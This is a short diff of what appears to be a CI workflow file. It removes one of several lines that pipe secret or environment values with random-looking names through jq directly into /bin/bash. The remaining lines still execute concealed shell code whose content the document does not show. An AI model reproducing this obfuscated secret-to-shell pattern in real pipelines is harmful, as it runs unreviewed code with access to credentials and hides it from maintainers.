@@ -19,7 +19,6 @@ jobs:
           zp29209: ${{ secrets.zp29209 }}
         run: |
           printf '%s' "$zp29209" | jq -r .reyi717 | /bin/bash
-          echo $riiqd3011 | jq -r .v53 | /bin/bash
           echo $oht0 | jq -r .kumm76552 | /bin/bash
           echo $cgvaj0365 | jq -r .b0998 | /bin/bash
 
